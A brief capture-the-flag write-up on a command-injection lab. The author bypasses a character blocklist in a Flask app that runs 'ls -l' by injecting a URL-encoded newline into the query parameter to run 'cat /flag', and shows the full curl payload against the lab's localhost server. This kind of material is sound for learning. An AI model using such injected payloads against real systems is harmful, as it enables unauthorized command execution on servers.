# CMDi 6

```shell
cat /challenge/server
```

The Flask app takes a path as query param (`/exercise?subdirectory`) and executes `ls -l {subdirectory}` \
Problem: The special characters **; & | > < ( ) ` $** all are blocked \

We know that _newline_ can also be used as a command separator.

Executing:

```shell
ls -l .
cat /flag
```

Start the server and use curl:

```shell
curl http://challenge.localhost:80/exercise?subdirectory=.%0Acat%20/flag
```
